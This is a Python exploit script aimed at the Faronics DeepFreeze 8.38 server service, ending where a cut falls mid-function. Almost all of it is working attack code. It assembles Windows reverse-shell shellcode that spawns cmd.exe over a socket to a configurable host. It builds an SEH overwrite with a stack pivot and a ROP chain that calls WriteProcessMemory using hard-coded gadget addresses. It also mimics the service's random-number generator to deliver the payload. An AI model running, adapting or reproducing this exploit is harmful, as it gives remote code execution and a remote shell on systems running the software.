"""
 Faronics DeepFreeze 8.38.220.5256 SEH Remote Exploit

    ██████  ███▄    █  ▒█████   █     █░ ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██
  ▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒
  ░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█ ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░
    ▒   ██▒▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██
  ▒██████▒▒▒██░   ▓██░░ ████▓▒░░░██▒██▓ ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓
  ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
  ░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░    ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
  ░  ░  ░     ░   ░ ░ ░ ░ ░ ▒    ░   ░  ░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░
        ░           ░     ░ ░      ░    ░ ░         ░           ░  ░      ░   ░  ░  ░
                                    Written by: snowcra5h@icloud.com (snowcra5h) 2023
    Installation:
    $ pip install keystone-engine capstone rich numpy

    Usage: 
    $ python snowcra5h_deepfreeze_exploit.py
"""

import ctypes, struct, numpy, socket
from keystone import *
from capstone import *
from rich.console import Console

REVSHELL_IP = "127.0.0.1" # the ip for the shellcode to reverse connect to
REVSHELL_PORT = "4444" # the port for the shellcode to reverse connect to

TARGET_IP = "127.0.0.1" # the target
TARGET_PORT = 7725 # the target port

DEBUG       = False
LOW_QWORD   = 1
HIGH_QWORD  = 0

qword_9ED208 = [0, 0] # dq 009ed208 L1 ; global rand value

KEY = 0xe # hash key for shellcode encryption

class Sin:
    def __init__(self, ip=None, port=None):
        self.ip = ip
        self.port = port
        self.__sin_addr = ""
        self.__sin_port = ""

        if self.ip and self.port:
            self.__to_sin_addr()
            self.__to_sin_port()

    def __to_sin_addr(self):
        sin_addr = []
        for block in self.ip.split("."):
            sin_addr.append(format(int(block), "02x"))
        sin_addr.reverse()
        self.__sin_addr = "0x" + "".join(sin_addr)

    def __to_sin_port(self):
        sin_port = format(int(self.port), "04x")
        self.__sin_port = "0x" + str(sin_port[2:4]) + str(sin_port[0:2])

    def get_sin_addr(self) -> str:
        return self.__sin_addr

    def get_sin_port(self) -> str:
        return self.__sin_port

class ShellCode:
    def __init__(self, ip, port):
        self.__sin = Sin(ip, port)
        self.__sin_addr = self.__sin.get_sin_addr()
        self.__sin_port = self.__sin.get_sin_port()

    def __ror_str(self, byte, count):
        binb = numpy.base_repr(byte, 2).zfill(32)
        while count > 0:
            binb = binb[-1] + binb[0:-1]
            count -= 1
        return (int(binb, 2))

    def __get_hash(self, esi):
        edx = 0x00
        ror_count = 0

        for eax in esi:
            edx = edx + ord(eax)
            if ror_count < len(esi)-1:
                edx = self.__ror_str(edx, KEY)
            ror_count += 1

        return edx

    def get_reverse_shell(self, debug=False) -> str:
        # kernel32.dll
        TerminateProcess = self.__get_hash("TerminateProcess")
        LoadLibraryA     = self.__get_hash("LoadLibraryA")
        CreateProcessA   = self.__get_hash("CreateProcessA")

        # ws2_32.dll
        WSAStartup = self.__get_hash("WSAStartup")
        WSASocketA = self.__get_hash("WSASocketA")
        WSAConnect = self.__get_hash("WSAConnect")

        if debug:
            int3 = "int3"
        else: 
            int3 = ""

        asm = [
            " start:                                 ",
           f"   {int3}                              ;",  #  debug
            "   mov   ebp, esp                      ;",
            "   add   esp, 0xfffff9f0               ;",  #   Avoid NULL bytes

            " find_kernel32:                         ",
            "   xor   ecx, ecx                      ;",  #   ECX = 0
            "   mov   esi,fs:[ecx+30h]              ;",  #   ESI = &(PEB) ([FS:0x30])
            "   mov   edx, 0xcafebabe               ;",  #
            "   sub   edx, 0xcafebab2               ;",  #   EDX = 0Ch
            "   mov   esi,[esi+edx]                 ;",  #   ESI = PEB->Ldr
            "   mov   esi,[esi+1Ch]                 ;",  #   ESI = PEB->Ldr.InInitOrder

            " next_module:                           ",  #
            "   mov   ebx, [esi+8h]                 ;",  #   EBX = InInitOrder[X].base_address
            "   mov   edx, 0xcafebabe               ;",
            "   sub   edx, 0xcafeba9e               ;",  #   EDX = 20h
            "   mov   edi, [esi+edx]                ;",  #   EDI = InInitOrder[X].module_name
            "   mov   esi, [esi]                    ;",  #   ESI = InInitOrder[X].flink (next)
            "   cmp   [edi+12*2], cx                ;",  #   (unicode) modulename[12] == 0x00? modulename[12] of kernel32.dll)
            "   jne   next_module                   ;",  #   No: try next module.

            " find_function_shorten:                 ",  #
            "   je find_function_shorten_bnc        ;",  #  jump if ECX == 0

            " find_function_ret:                     ",  #
            "   pop esi                             ;",  #   POP the return address from the stack
            "   mov   [ebp+0x04], esi               ;",  #   Save find_function address for later usage
            "   je resolve_symbols_kernel32         ;",  #

            " find_function_shorten_bnc:             ",  #   
            "   call find_function_ret              ;",  #   Relative CALL with negative offset

            " find_function:                         ",  #
            "   pushad                              ;",  #   Save all registers. Base address of kernel32 is in EBX from (find_kernel32)
            "   mov   eax, [ebx+0x3c]               ;",  #   Offset to PE Signature
            "   mov   edi, [ebx+eax+0x78]           ;",  #   Export Table Directory RVA
            "   add   edi, ebx                      ;",  #   Export Table Directory VMA
            "   mov   ecx, [edi+0x18]               ;",  #   NumberOfNames
            "   mov   edx, 0xcafebabe               ;",
            "   sub   edx, 0xcafeba9e               ;",  #   EDX = 20h
            "   mov   eax, [edi+edx]                ;",  #   AddressOfNames RVA
            "   add   eax, ebx                      ;",  #   AddressOfNames VMA
            "   mov   [ebp-4], eax                  ;",  #   Save AddressOfNames VMA for later

            " find_function_loop:                    ",  #
            "   jecxz find_function_finished        ;",  #   Jump to the end if ECX is 0
            "   dec   ecx                           ;",  #   Decrement our names counter
            "   mov   eax, [ebp-4]                  ;",  #   Restore AddressOfNames VMA
            "   mov   esi, [eax+ecx*4]              ;",  #   Get the RVA of the symbol name
            "   add   esi, ebx                      ;",  #   Set ESI to the VMA of the current symbol name

            " compute_hash:                          ",  #
            "   xor   eax, eax                      ;",  #   NULL EAX
            "   cdq                                 ;",  #   NULL EDX
            "   cld                                 ;",  #   Clear direction

            " compute_hash_again:                    ",  #
            "   lodsb                               ;",  #   Load the next byte from esi into al
            "   test  al, al                        ;",  #   Check for NULL terminator
            "   jz    compute_hash_finished         ;",  #   If the ZF is set, we've hit the NULL term
           f"   ror   edx, {KEY}                    ;",  #   rotate right by 13
            "   add   edx, eax                      ;",  #   Add the new byte to the accumulator
            "   jne   compute_hash_again            ;",  #   Next iteration

            " compute_hash_finished:                 ",  #
            " find_function_compare:                 ",  #
            "   cmp   edx, [esp+0x24]               ;",  #   Compare the computed hash with the requested hash
            "   jnz   find_function_loop            ;",  #   If it doesn't match go back to find_function_loop
            "   mov   edx, [edi+0x24]               ;",  #   AddressOfNameOrdinals RVA
            "   add   edx, ebx                      ;",  #   AddressOfNameOrdinals VMA
            "   push  eax                           ;",  #   Store EAX correction for bad character
            "   xor   eax, eax                      ;",  #   EAX = 0 
            "   mov   ax,  [edx+2*ecx]              ;",  #   Extrapolate the function's ordinal
            "   mov   cx, ax                        ;",  #   CX = AX
            "   pop   eax                           ;",  #   Restore EAX 
            "   mov   edx, [edi+0x1c]               ;",  #   AddressOfFunctions RVA
            "   add   edx, ebx                      ;",  #   AddressOfFunctions VMA
            "   mov   eax, [edx+4*ecx]              ;",  #   Get the function RVA
            "   add   eax, ebx                      ;",  #   Get the function VMA
            "   mov   [esp+0x1c], eax               ;",  #   Overwrite stack version of eax from pushad
            "   nop                                 ;",  #   nop for bad char
        
            " find_function_finished:                ",  #
            "   popad                               ;",  #   Restore registers
            "   ret                                 ;",  #

            " resolve_symbols_kernel32:              ",
           f"   push  {TerminateProcess}            ;",  #   TerminateProcess hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x10], eax               ;",  #   Save TerminateProcess address for later usage
    
           f"   push  {LoadLibraryA}                ;",  #   LoadLibraryA hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x14], eax               ;",  #   Save LoadLibraryA address for later usage
    
           f"   push  {CreateProcessA}              ;",  #   CreateProcessA hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x18], eax               ;",  #   Save CreateProcessA address for later usage

            " load_ws2_32:                           ",  #
            "   xor   eax, eax                      ;",  #   Null EAX
            "   mov   ax, 0x6c6c                    ;",  #   Move the end of the string in AX;
            "   push  eax                           ;",  #   Push \0\0ll on the stack
            "   push  0x642e3233                    ;",  #   Push d.23 on the stack
            "   push  0x5f327377                    ;",  #   Push _2sw on the stack
            "   push  esp                           ;",  #   Push ESP to have a pointer to the string
            "   call  dword ptr [ebp+0x14]          ;",  #   Call EAX = LoadLibrary(TEXT("ws2_32.dll")); 
            "   mov   ebx, eax                      ;",  #   Move the base address of ws2_32.dll to EBX

            " resolve_symbols_ws2_32:                ",  #   proceed into the resolve_symbols_ws2_32 function
           f"   push  {WSAStartup}                  ;",  #   WSAStartup hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x1C], eax               ;",  #   Save WSAStartup address for later usage

            " resolve_symbols_WSASocketA:            ",  
           f"   push  {WSASocketA}                  ;",  #   WSASocketA hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   push  edx                           ;",  #   Save EBX bad character
            "   mov   edx, 0xcafebabe               ;",  # 
            "   sub   edx, 0xcafeba9e               ;",  #   EDX = 20h
            "   add   edx, ebp                      ;",  #   EDX = EBP + EDX
            "   mov   [edx], eax                    ;",  #   Save WSASocketA address for later usage
            "   pop   edx                           ;",  #   Restore EBX

            " resolve_symbols_WSAConnect:            ",
           f"   push  {WSAConnect}                  ;",  #   WSAConnect hash
            "   call  dword ptr [ebp+0x04]          ;",  #   Call find_function
            "   mov   [ebp+0x24], eax               ;",  #   Save WSAConnect address for later usage

            " call_WSAStartup:                       ",  #
            "   mov   eax, esp                      ;",  #   Move ESP to EAX; eax = &esp
            "   mov   cx, 0x590                     ;",  #   Move 0x590 to CX; 
            "   sub   eax, ecx                      ;",  #   Subtract CX from EAX to avoid overwriting the structure later; 
                                                         #   because the space gets populated by the lpWSAData struct
            "   push  eax                           ;",  #   Push lpWSAData
            "   xor   eax, eax                      ;",  #   Null EAX
            "   mov   ax, 0x0202                    ;",  #   Move version to AX
            "   push  eax                           ;",  #   Push wVersionRequired
            "   call dword ptr [ebp+0x1C]           ;",  #   Call WSAStartup

            " call_WSASocketA:                       ",  #
            "   xor   eax, eax                      ;",  #   Null EAX
            "   push  eax                           ;",  #   Push dwFlags
            "   push  eax                           ;",  #   Push g
            "   push  eax                           ;",  #   Push lpProtocolInfo
            "   mov   al, 0x06                      ;",  #   Move AL, IPPROTO_TCP
            "   push  eax                           ;",  #   Push protocol
            "   sub   al, 0x05                      ;",  #   Subtract 0x05 from AL, AL = 0x01
            "   push  eax                           ;",  #   Push type
            "   inc   eax                           ;",  #   Increase EAX, EAX = 0x02
            "   push  eax                           ;",  #   Push af
            "   xor   edx, edx                      ;",  #   Clear EDX for bad char 0x20
            "   mov   edx, 0xcafebabe               ;",
            "   sub   edx, 0xcafeba9e               ;",  #   EDX = 20h
            "   add edx, ebp                        ;",  #   EDX = ebp + 0x20
            "   call dword ptr [edx]                ;",  #   Call WSASocketA; returns descriptor or -1 in EAX
    
            " call_wsaconnect:                       ",  #
            "   mov   esi, eax                      ;",  #   Move the SOCKET descriptor to ESI
            "   xor   eax, eax                      ;",  #   Null EAX
            "   push  eax                           ;",  #   Push sin_zero[]
            "   push  eax                           ;",  #   Push sin_zero[]

           f"   push  {self.__sin_addr}             ;",  #   Push sin_addr 
           f"   mov   ax, {self.__sin_port}         ;",  #   Move the sin_port to AX
            "   nop                                 ;",  #   avoid bad char in jmp
            "   shl   eax, 0x10                     ;",  #   Left shift EAX by 0x10 bits
            "   add   ax, 0x02                      ;",  #   Add 0x02 (AF_INET) to AX
            "   push  eax                           ;",  #   Push sin_port & sin_family
            "   push  esp                           ;",  #   Push pointer to the sockaddr_in structure
            "   pop   edi                           ;",  #   Store pointer to sockaddr_in in EDI
            "   xor   eax, eax                      ;",  #   Null EAX
            "   push  eax                           ;",  #   Push lpGQOS
            "   push  eax                           ;",  #   Push lpSQOS
            "   push  eax                           ;",  #   Push lpCalleeData
            "   push  eax                           ;",  #   Push lpCallerData
            "   add   al, 0x10                      ;",  #   Set AL to 0x10
            "   push  eax                           ;",  #   Push namelen
            "   push  edi                           ;",  #   Push *name
            "   push  esi                           ;",  #   Push s
            "   call dword ptr [ebp+0x24]           ;",  #   Call WSAConnect

            " create_startupinfoa:                   ",  #   Push the ESI register, holds our socket descriptor, three times
            "   push  esi                           ;",  #   Push hStdError  ; basically does dup2
            "   push  esi                           ;",  #   Push hStdOutput ; 
            "   push  esi                           ;",  #   Push hStdInput  ; 
            "   xor   eax, eax                      ;",  #   Null EAX   
            "   push  eax                           ;",  #   Push lpReserved2
            "   push  eax                           ;",  #   Push cbReserved2 & wShowWindow
            "   mov   al, 0x80                      ;",  #   Move 0x80 to AL
            "   xor   ecx, ecx                      ;",  #   Null ECX
            "   mov   cl, 0x80                      ;",  #   Move 0x80 to CL
            "   add   eax, ecx                      ;",  #   Set EAX to 0x100
            "   push  eax                           ;",  #   Push dwFlags
            "   xor   eax, eax                      ;",  #   Null EAX   
            "   push  eax                           ;",  #   Push dwFillAttribute
            "   push  eax                           ;",  #   Push dwYCountChars
            "   push  eax                           ;",  #   Push dwXCountChars
            "   push  eax                           ;",  #   Push dwYSize
            "   push  eax                           ;",  #   Push dwXSize
            "   push  eax                           ;",  #   Push dwY
            "   push  eax                           ;",  #   Push dwX
            "   push  eax                           ;",  #   Push lpTitle
            "   push  eax                           ;",  #   Push lpDesktop
            "   push  eax                           ;",  #   Push lpReserved
            "   mov   al, 0x44                      ;",  #   Move 0x44 to AL; ?? sizeof(STARTUPINFOA) = 0x44 bytes;
            "   push  eax                           ;",  #   Push cb
            "   push  esp                           ;",  #   Push pointer to the STARTUPINFOA structure
            "   pop   edi                           ;",  #   Store pointer to STARTUPINFOA in EDI

            " create_cmd_string:                     ",  #
            "   mov   eax, 0xff9a879b               ;",  #   Move 0xff9a879b into EAX ; 'exe'
            "   neg   eax                           ;",  #   Negate EAX, EAX = 00657865; '.dmc'
            "   push  eax                           ;",  #   Push part of the "cmd.exe" string
            "   push  0x2e646d63                    ;",  #   Push the remainder of the "cmd.exe" string
            "   push  esp                           ;",  #   Push pointer to the "cmd.exe" string
            "   pop   ebx                           ;",  #   Store pointer to the "cmd.exe" string in EBX

            " call_createprocessa:                   ",  #
            "   mov   eax, esp                      ;",  #   Move ESP to EAX
            "   xor   ecx, ecx                      ;",  #   Null ECX
            "   mov   cx, 0x390                     ;",  #   Move 0x390 to CX
            "   sub   eax, ecx                      ;",  #   Subtract CX from EAX to avoid overwriting the structure later
            "   push  eax                           ;",  #   Push lpProcessInformation
            "   push  edi                           ;",  #   Push lpStartupInfo
            "   xor   eax, eax                      ;",  #   Null EAX
            "   push  eax                           ;",  #   Push lpCurrentDirectory
            "   push  eax                           ;",  #   Push lpEnvironment
            "   push  eax                           ;",  #   Push dwCreationFlags
            "   inc   eax                           ;",  #   Increase EAX, EAX = 0x01 (TRUE)
            "   push  eax                           ;",  #   Push bInheritHandles
            "   dec   eax                           ;",  #   Null EAX
            "   push  eax                           ;",  #   Push lpThreadAttributes
            "   push  eax                           ;",  #   Push lpProcessAttributes
            "   push  ebx                           ;",  #   Push lpCommandLine
            "   push  eax                           ;",  #   Push lpApplicationName
            "   call dword ptr [ebp+0x18]           ;",  #   Call CreateProcessA

            " call_terminate_process:                ",  #
            "   xor   ecx, ecx                      ;",  #   Null ECX
            "   push  ecx                           ;",  #   uExitCode
            "   push  0xffffffff                    ;",  #   hProcess
            "   call dword ptr [ebp+0x10]           ;",  #   Call TerminateProcess
        ]
        return "\n".join(asm)

def encode_all(code, platform="x86"):
    mode = KS_MODE_32 if platform == "x86" else KS_MODE_64
    ks = Ks(KS_ARCH_X86, mode)

    encoding, count = ks.asm(code)

    instructions = list(encoding)       # Converting encoding to a list of integers
    shellcode = bytearray(encoding)     # Converting encoding to a bytearray

    return instructions, shellcode

def decode_all(instructions, badchars, platform="x86"):

    bad = []
    # reformat the bad characters
    chars = badchars.split(' ')
    for c in chars:
        bad.append(int(c, 16))

    # now decode so we have the instructions and the shellcode
    if platform == "x86":
        md = Cs(CS_ARCH_X86, CS_MODE_32)
    else:
        md = Cs(CS_ARCH_X86, CS_MODE_64)

    for i in md.disasm(bytes(instructions), 0x1000):
        shellcode = ""
        for b in i.bytes:
            shellcode = shellcode + hex(b).replace("0x", "").rjust(2, "0") + " "
            
            address = hex(i.address)
            address = "[white bold]" + address.ljust(8, " ") + "[/]"

            if(i.mnemonic.startswith("call")):
                mnemonic = i.mnemonic.ljust(7, " ")
                op_str = i.op_str
                op_str = op_str.ljust(40, " ")
                mnemonic = "[green bold]%s[/]" % mnemonic
                op_str = op_str.replace("[", "\[")
                op_str = "[green bold]%s[/]" % op_str
            else:
                mnemonic = i.mnemonic.ljust(7, " ")
                op_str = i.op_str
                op_str = op_str.ljust(40, " ")
                mnemonic = "[blue bold]%s[/]" % mnemonic
                op_str = op_str.replace("[", "\[")
                op_str = "[blue bold]%s[/]" % op_str

        console = Console()
        
        colored_bytes, bad_flag = format_code(shellcode, bad)
        console.print(address + mnemonic + op_str + "; " + colored_bytes)
        if bad_flag:
            console.print(f"[white bold]\nBad instruction found {colored_bytes}\nHit enter to continue or [Q]uit:")
            if input("").upper() == "Q":
                quit()

def format_code(code, bad):
    if code == "":
        return ""
    
    nums = code.split(' ')
    colored_byte = ""
    bad_flag = False

    for n in nums:
        if n == '':
            break
        if int(n, 16) in bad:
            colored_byte = colored_byte + "[red bold]" + n + '[/] '
            bad_flag = True
        else:
            colored_byte = colored_byte + "[white bold]" + n + '[/] '

    return (colored_byte, bad_flag)

def get_revshell(ip: str, port: str, bad_chars="", debug=False, winbox=False) -> bytes:

    sc = ShellCode(ip, port)
    rev_shellcode = sc.get_reverse_shell(debug)

    instructions, shellcode = encode_all(rev_shellcode)

    if bad_chars != "":
        decode_all(instructions, bad_chars)

    if winbox:
        ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                ctypes.c_int(len(shellcode)),
                ctypes.c_int(0x3000),
                ctypes.c_int(0x40)
        )

        buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                             buf,
                                             ctypes.c_int(len(shellcode)))

        print("Shellcode located at address %s" % hex(ptr))
        input("...ENTER TO EXECUTE SHELLCODE...")

        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(ptr),
                                                 ctypes.c_int(0),
                                                 ctypes.c_int(0),
                                                 ctypes.pointer(ctypes.c_int(0)))

        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

    return shellcode

def get_seh_overwrite() -> bytes:
    offset_to_call = 3632
    offset_to_ropchain = 20
    offset_to_eip = 3756

    seh_gadgets = {
        "popad ; salc ; cld ; call  [eax-0x18]; (6224cf)" : struct.pack("<L", 0x6224cf),
        "xchg eax, esp ; ret ; (441ec6)" : struct.pack('<L', 0x441ec6),
        "add esp, 0x000000BC ; ret ; (62374f)" : struct.pack('<L', 0x62374f), 
    }

    # This is where we jump to after call [eax-0x18] ; we will xchg eax for esp so we can pivot to a rop chain
    seh_chain = b'A' * offset_to_call
    seh_chain += seh_gadgets["xchg eax, esp ; ret ; (441ec6)"]

    # this offsets our stack to the WPM ropchain
    seh_chain += b'B' * offset_to_ropchain
    seh_chain += seh_gadgets["add esp, 0x000000BC ; ret ; (62374f)"]

    # set up the stack for our ropchain to WriteProcessMemory [this is where PPR would typically go]
    seh_chain += b'C' * ((offset_to_eip - len(seh_chain)) - 4)
    seh_chain += seh_gadgets["xchg eax, esp ; ret ; (441ec6)"] # (nseh)
    seh_chain += seh_gadgets["popad ; salc ; cld ; call  [eax-0x18]; (6224cf)"] # EIP
    seh_chain += b"\x90" * 24 # there are bad bytes that this overwrites

    return seh_chain

def get_wpm_ropchain() -> bytes:
    """
        -------------------------------
        BOOL WriteProcessMemory(
          HANDLE  hProcess,
          LPVOID  lpBaseAddress,
          LPCVOID lpBuffer,
          SIZE_T  nSize,
          SIZE_T  *lpNumberOfBytesWritten
        );
        -------------------------------
    """
    skeleton  = struct.pack("<L", 0x41414141) # WriteProcessMemory address
    skeleton += struct.pack("<L", 0x00f56c00) # shellcode return address to return to after WriteProcessMemory is called
    skeleton += struct.pack("<L", 0xffffffff) # hProcess (pseudo Process handle)
    skeleton += struct.pack("<L", 0x00f56c00) # lpBaseAddress (Code cave address)
    skeleton += struct.pack("<L", 0x45454545) # lpBuffer (shellcode stack address)
    skeleton += struct.pack("<L", 0x46464646) # nSize (size of shellcode)
    skeleton += struct.pack("<L", 0x0135fc40) # lpNumberOfBytesWritten (writable memory address, i.e. !dh -a MODULE; address just past size value +0x4)
    skeleton += b"\x90" * 36 # 36 bytes is the distance between our stub and where our ropchain continues.

    rop_gadgets = {
        # write what where
        "mov dword ptr [eax], ecx; ret;" : struct.pack("<L", 0x00762cb7),
        "mov dword ptr [edx], eax; ret; (00588a1a)" : struct.pack("<L", 0x00588a1a),

        # ptr deref
        "mov eax, dword ptr [eax]; ret; (006700c4)" : struct.pack("<L", 0x006700c4),

        # arithmetic
        "sub eax, ecx; ret;" : struct.pack("<L", 0x006654c2),
        "neg eax; ret;" : struct.pack("<L", 0x006bc6f5),
        "add edx, esi; ret; (0060cabf)" : struct.pack("<L", 0x0060cabf),

        # get next skeleton offset gadgets
        "inc eax; ret;" : struct.pack("<L", 0x0044bd6c),
        "inc edx; ret; (0086bc16)" : struct.pack("<L", 0x0086bc16),
        "inc esi; ret; (00587706)" : struct.pack("<L", 0x00587706),

        # mov skeleton address for arithmetic
        "mov eax, esi; pop esi; ret;" : struct.pack("<L", 0x5721a6),
        "mov eax, edx; ret; (0x005039bd)" : struct.pack("<L", 0x005039bd),
        "xchg esi, eax; ret;" : struct.pack("<L", 0x004e8662),
        "xchg ecx, eax; ret;" : struct.pack("<L", 0x0063c33e),
        "mov eax, ecx; ret;" : struct.pack("<L", 0x005b63d9),

        # pop for arithmetic
        "pop eax; ret;" : struct.pack("<L", 0x004d76f4),
        "pop ecx; ret (4a55fb);" : struct.pack("<L", 0x4a55fb),
        "pop esi ; ret;" : struct.pack('<L', 0x4b7c19),

        # push for next skeleton address
        "push esp ; pop esi ; ret;" : struct.pack('<L', 0x5d13eb),
        "dec esp; ret;" : struct.pack("<L", 0x0047aeff),
        "push eax ; add al, 0x59 ; pop edx ; pop edi ; pop esi ; ret ; (75c91a)" : struct.pack("<L", 0x75c91a),
        "sub al, 0x59; pop ebp ; ret; (42245b)" : struct.pack("<L", 0x42245b),

        # return to esp
        "xchg esp, eax; ret; (00441ec6)" : struct.pack("<L", 0x00441ec6),

        # zero registers
        "xor edx, edx; xor eax, eax; ret; (007caa92)" : struct.pack("<L", 0x007caa92),

        # constant hardcoded
        "LoadLibraryAStub IAT (0135fbac)" : struct.pack("<L", 0x0135fbac),
        "KERNEL32!WriteProcessMemoryStub Offset to &LoadLibraryAStub (fffe6290)" : struct.pack("<L", 0xfffe6290),
        "relative nSize offset to WriteProcessMemory" : struct.pack("<L", (0xffffffec)), # -0x14
	    "-size of shellcode" : struct.pack("<L", (0xfffffdf4)), # -524
        "junk" : struct.pack("<L", 0xdeadbeef),

        # variable hardcoded
        "relative lpBuffer offset from shellcode" : struct.pack("<L", (0xfffffd10)), # 752 
        "first shellcode address offset to be added" : struct.pack("<L", (0x77777878)), 
	    "second shellcode address offset to be added" : struct.pack("<L", (0x88888888)), 
        "start of skeleton offset" : struct.pack("<L", (0xffffffb0 + 0xc)), # -68

        # OLD
        "mov ecx, [ecx] ; mov [eax], ecx ; pop ebp ; ret;" : struct.pack("<L", 0x7cdbd5),
        "add eax, ecx ; pop ecx ; pop ebp ; ret ;" : struct.pack("<L", 0x476b06),
    }

    # offset EAX to the start of our dummy driver
    rop = skeleton + rop_gadgets["push esp ; pop esi ; ret;"]
    rop += rop_gadgets["mov eax, esi; pop esi; ret;"] # EAX = ESP
    rop += rop_gadgets["junk"] # junk in ESI 
    rop += rop_gadgets["pop ecx; ret (4a55fb);"] # ECX = start of skeleton offset
    rop += rop_gadgets["start of skeleton offset"] # ECX = -68
    rop += rop_gadgets["add eax, ecx ; pop ecx ; pop ebp ; ret ;"] # EAX = start of skeleton
    rop += rop_gadgets["junk"]
    rop += rop_gadgets["junk"]

    # Obtain the WriteProcessMemory VMA

    # KERNEL32 IAT (module DFServerService)
    # _IMAGE_IMPORT_DESCRIPTOR 0135f9b8
    # KERNEL32.DLL
    #           0135FBAC Import Address Table
    #           00400000 Import Name Table
    #                  0 time date stamp
    #                  0 Index of first forwarder reference

    # API Calls to resolve WPMStub.
    # 0135fbac 77738b20 KERNEL32!LoadLibraryAStub   (IAT)
    # 77752890 KERNEL32!WriteProcessMemoryStub      (VMA)

    # 0:065> ? 77738b20 - 77752890 
    # Evaluate expression: -105840 = fffe6290       (RVA)

    # 0:065> u 77738b20 - fffe6290                  (Offset)
    # KERNEL32!WriteProcessMemoryStub:
    # 77752890 8bff            mov     edi,edi
    # 77752892 55              push    ebp
    # 77752893 8bec            mov     ebp,esp
    # 77752895 5d              pop     ebp
    # 77752896 ff2588477977    jmp     dword ptr [KERNEL32!_imp__WriteProcessMemory (77794788)]
    # 7775289c cc              int     3

    rop += rop_gadgets["xchg esi, eax; ret;"] # ESI = start of skeleton
    rop += rop_gadgets["xor edx, edx; xor eax, eax; ret; (007caa92)"] # EDX = 0 
    rop += rop_gadgets["pop eax; ret;"] # EAX = LoadLibraryAStub IAT
    rop += rop_gadgets["LoadLibraryAStub IAT (0135fbac)"] 
    rop += rop_gadgets["mov eax, dword ptr [eax]; ret; (006700c4)"] # EAX = &LoadLibraryAStub
    rop += rop_gadgets["pop ecx; ret (4a55fb);"] # ECX = WPMOffset
    rop += rop_gadgets["KERNEL32!WriteProcessMemoryStub Offset to &LoadLibraryAStub (fffe6290)"]
    rop += rop_gadgets["sub eax, ecx; ret;"] # EAX = &WriteProcessMemoryStub
    rop += rop_gadgets["add edx, esi; ret; (0060cabf)"] # EDX = ESI = Start of skeleton
    rop += rop_gadgets["mov dword ptr [edx], eax; ret; (00588a1a)"] # skeleton[0] = &KERNEL32!WriteProcessMemoryStub

    # offset to lPbuffer
    for _ in range(0, 16):
        rop += rop_gadgets["inc edx; ret; (0086bc16)"]

    rop += rop_gadgets["mov eax, edx; ret; (0x005039bd)"]
    rop += rop_gadgets["pop ecx; ret (4a55fb);"]
    rop += rop_gadgets["relative lpBuffer offset from shellcode"]
    rop += rop_gadgets["sub eax, ecx; ret;"]
    rop += rop_gadgets["mov dword ptr [edx], eax; ret; (00588a1a)"]

    # offset skeleton to nSize
    rop += rop_gadgets["inc edx; ret; (0086bc16)"]
    rop += rop_gadgets["inc edx; ret; (0086bc16)"]
    rop += rop_gadgets["inc edx; ret; (0086bc16)"]
    rop += rop_gadgets["inc edx; ret; (0086bc16)"]

    rop += rop_gadgets["pop eax; ret;"]
    rop += rop_gadgets["-size of shellcode"] 
    rop += rop_gadgets["neg eax; ret;"]
    rop += rop_gadgets["xchg ecx, eax; ret;"]
    rop += rop_gadgets["mov eax, edx; ret; (0x005039bd)"]
    rop += rop_gadgets["mov dword ptr [eax], ecx; ret;"]

    # return to WPM
    rop += rop_gadgets["pop ecx; ret (4a55fb);"]
    rop += rop_gadgets["relative nSize offset to WriteProcessMemory"]
    rop += rop_gadgets["add eax, ecx ; pop ecx ; pop ebp ; ret ;"]
    rop += rop_gadgets["junk"]
    rop += rop_gadgets["junk"]
    rop += rop_gadgets["xchg esp, eax; ret; (00441ec6)"]

    return rop

def get_shellcode() -> bytes:
    sc  = b"\x90" * 16
    sc += get_revshell(REVSHELL_IP, REVSHELL_PORT)
    sc += b"\x90" * 16

    return sc

def build_exploitchain(szmax_expchain) -> bytes:
    # create exploit chain

    size_of_ropchain = 0x300

    seh = get_seh_overwrite()
    rop = get_wpm_ropchain()
    rop += b"A" * (size_of_ropchain - len(rop)) # we want our shellcode always at the same offset.
    shellcode = get_shellcode()

    exploit_chain = seh + rop + shellcode
    sz_expchain = len(exploit_chain)
    padding = b'\x90' * (szmax_expchain - sz_expchain)

    payload = exploit_chain + padding

    return payload

def seed_rng(seed_value):
    global qword_9ED208
    qword_9ED208[HIGH_QWORD] = seed_value
    qword_9ED208[LOW_QWORD] = 0
    return __get_next_rng()

def __get_next_rng():
    global qword_9ED208
    qword_9ED208[HIGH_QWORD] = ctypes.c_uint32(qword_9ED208[HIGH_QWORD] * 0x15A4E35 + 1).value
    return (qword_9ED208[HIGH_QWORD] >> 16) & 0x7FFF

def get_large_random():
    global qword_9ED208

